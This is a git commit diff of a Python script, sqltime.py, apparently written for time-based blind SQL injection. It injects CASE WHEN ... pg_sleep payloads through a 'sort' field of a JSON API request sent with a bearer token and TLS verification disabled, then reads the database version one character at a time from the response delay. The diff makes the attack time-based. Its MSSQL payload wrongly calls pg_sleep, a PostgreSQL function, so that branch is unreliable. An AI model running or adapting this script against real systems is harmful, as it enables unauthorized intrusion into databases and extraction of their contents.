cf63d2acc6fc7c10cc2ecae2a8a1122ed5bc9055
doxnam <96875922+doxnam@users.noreply.github.com>
2025-01-17 13:08:28 +0700

    Update sqltime.py

--- sqltime.py
+++ sqltime.py
@@ -1,4 +1,5 @@
 import requests
+import time
 import urllib3
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
@@ -21,34 +22,33 @@ headers = {
     "Authorization": f"Bearer {auth_token}",
     "Origin": "https://dev.example.com",
     "Referer": "https://dev.example.com/",
-    "Connection": "keep-alive",
+    "Connection": "keep-alive"
 }
 
-
-def send_sqli(payload):
+def send_sqli(payload, delay_threshold=4):
     try:
         # Tạo JSON dữ liệu gửi đi
         json_data = {
             "sourceCode": "909",
             "size": 10,
-            "sort": ["425" + payload],
-            "accountNumber": "909C010766",
+            "sort": ["425"+payload],
+            "accountNumber": "909C010766"
         }
 
-        response = requests.post(
-            base_url, headers=headers, proxies=proxies, json=json_data, verify=False
-        )
+        start_time = time.time()  # Ghi lại thời gian bắt đầu
+        response = requests.post(base_url, headers=headers, proxies=proxies, json=json_data, verify=False)
+        end_time = time.time()  # Ghi lại thời gian kết thúc
 
-        if response.status_code == 200:
-            return False
-        elif response.status_code == 500:
-            return True
+        response_time = end_time - start_time  # Tính thời gian phản hồi
+
+        # Kiểm tra xem thời gian phản hồi có vượt quá ngưỡng không (giả sử là 4 giây)
+        if response_time >= delay_threshold:
+            return True  # Thời gian phản hồi lâu cho thấy ký tự đúng
         else:
-            return None
+            return False  # Thời gian phản hồi ngắn cho thấy ký tự sai
     except requests.exceptions.SSLError as e:
         print(f"SSL error: {e}")
         return None
-
 
 def extract_db_version(db_type, max_length=100):
     db_version = ""
@@ -67,7 +67,7 @@ def extract_db_version(db_type, max_length=100):
         ),
         4: lambda db_version, char: (  # MSSQL
             f"orderId,(SELECT CASE WHEN (SELECT @@version LIKE '{db_version}{char}%') THEN pg_sleep(4) ELSE pg_sleep(0) END)"
-        ),
+        )
     }
 
     for i in range(1, max_length + 1):
@@ -84,7 +84,6 @@ def extract_db_version(db_type, max_length=100):
             break
 
     return db_version
-
 
 if __name__ == "__main__":
     print("Chọn loại cơ sở dữ liệu:")
